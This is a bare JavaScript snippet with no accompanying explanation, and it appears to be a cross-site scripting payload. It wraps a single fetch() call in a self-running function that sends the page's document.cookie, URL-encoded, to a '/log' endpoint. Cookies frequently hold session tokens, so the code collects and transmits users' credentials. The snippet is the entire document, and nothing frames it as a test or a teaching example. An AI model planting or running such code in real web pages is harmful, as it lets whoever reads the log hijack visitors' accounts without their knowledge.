(function(){
  fetch("/log?c=" + encodeURIComponent(document.cookie));
})();